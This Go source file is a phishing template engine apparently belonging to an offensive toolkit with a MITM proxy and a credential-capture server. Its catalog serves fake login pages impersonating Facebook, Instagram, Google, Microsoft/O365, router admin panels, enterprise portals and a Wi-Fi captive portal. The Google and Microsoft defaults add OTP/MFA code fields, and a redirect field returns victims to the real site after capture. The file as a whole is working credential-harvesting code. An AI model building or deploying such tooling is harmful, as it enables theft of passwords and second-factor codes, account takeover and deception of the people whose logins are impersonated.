// Package phish implements the phishing template engine: embedded HTML login
// pages, a standalone capture server and inline form-swap support used by the
// MITM proxy.
package phish

import (
	"bytes"
	"embed"
	"fmt"
	"html/template"
	"sort"
	"strings"
)

// TemplateFS embeds the bundled HTML login pages so the capture server and
// MITM proxy can serve them without external asset files.
//
//go:embed templates/*.html
var TemplateFS embed.FS

// Template describes one embedded phishing page.
type Template struct {
	// ID is the template key, e.g. "facebook".
	ID string
	// Title is shown in listings.
	Title string
	// Description notes what the template is for.
	Description string
}

// Fields configures how a template renders.
type Fields struct {
	Title         string
	Brand         string
	UsernameLabel string
	PasswordLabel string
	ShowOTP       bool
	OTPLabel      string
	ButtonText    string
	Action        string // form action URL
	Orig          string // original login URL to redirect back to after capture
	ShowEmail     bool
	EmailLabel    string
	LogoColor     string
	LogoText      string
	ButtonColor   string
	Subtitle      string
}

// catalog lists the bundled templates.
var catalog = map[string]Template{
	"facebook":      {ID: "facebook", Title: "Facebook", Description: "Facebook login page"},
	"instagram":     {ID: "instagram", Title: "Instagram", Description: "Instagram login page"},
	"google":        {ID: "google", Title: "Google / Gmail", Description: "Google account sign-in with optional OTP field"},
	"microsoft":     {ID: "microsoft", Title: "Microsoft / O365", Description: "Microsoft account sign-in with optional MFA code"},
	"generic":       {ID: "generic", Title: "Generic portal", Description: "Enterprise-style portal login"},
	"router":        {ID: "router", Title: "Router admin", Description: "Router/IoT administration login"},
	"captiveportal": {ID: "captiveportal", Title: "Wi-Fi captive portal", Description: "Guest Wi-Fi password collection page"},
}

// parsed holds the compiled templates, keyed by ID.
var parsed = mustParse()

func mustParse() map[string]*template.Template {
	out := map[string]*template.Template{}
	for id := range catalog {
		data, err := TemplateFS.ReadFile("templates/" + id + ".html")
		if err != nil {
			panic(fmt.Sprintf("phish: missing embedded template %s: %v", id, err))
		}
		tmpl, err := template.New(id).Parse(string(data))
		if err != nil {
			panic(fmt.Sprintf("phish: parse template %s: %v", id, err))
		}
		out[id] = tmpl
	}
	return out
}

// ListTemplates returns the catalog sorted by ID.
func ListTemplates() []Template {
	ids := make([]string, 0, len(catalog))
	for id := range catalog {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	out := make([]Template, 0, len(ids))
	for _, id := range ids {
		out = append(out, catalog[id])
	}
	return out
}

// GetTemplate returns a template by ID.
func GetTemplate(id string) (Template, bool) {
	t, ok := catalog[id]
	return t, ok
}

// DefaultFields returns the standard field set for a template, with an empty
// Action/Orig to be filled by the caller.
func DefaultFields(id string) Fields {
	switch id {
	case "facebook":
		return Fields{Title: "Facebook", Subtitle: "Log in to Facebook", ButtonText: "Log In"}
	case "instagram":
		return Fields{Title: "Instagram", Subtitle: "Log in to Instagram", ButtonText: "Log In"}
	case "google":
		return Fields{Title: "Google", Subtitle: "Use your Google Account", ButtonText: "Next", ShowOTP: true, OTPLabel: "Enter verification code"}
	case "microsoft":
		return Fields{Title: "Microsoft", Subtitle: "Sign in", ButtonText: "Sign in", ShowOTP: true, OTPLabel: "Verification code"}
	case "router":
		return Fields{Title: "Router Administration", Subtitle: "Enter your administrator credentials", ButtonText: "Login", UsernameLabel: "Username", PasswordLabel: "Password"}
	case "captiveportal":
		return Fields{Title: "Guest Network", Subtitle: "This Wi-Fi network is protected. Enter the password to connect.", ButtonText: "Connect", PasswordLabel: "Password"}
	default:
		return Fields{Title: "Enterprise Portal", Subtitle: "Sign in with your corporate account", ButtonText: "Sign In", UsernameLabel: "Username", PasswordLabel: "Password"}
	}
}

// Render produces the HTML for a template.
func Render(id string, f Fields) (string, error) {
	tmpl, ok := parsed[id]
	if !ok {
		return "", fmt.Errorf("unknown template %q", id)
	}
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, f); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// IsKnownTemplate reports whether id is in the catalog.
func IsKnownTemplate(id string) bool {
	_, ok := catalog[id]
	return ok
}

// NormalizeTemplateID lower-cases and strips path elements from a template id.
func NormalizeTemplateID(id string) string {
	id = strings.ToLower(strings.TrimSpace(id))
	if i := strings.LastIndex(id, "/"); i >= 0 {
		id = id[i+1:]
	}
	return id
}
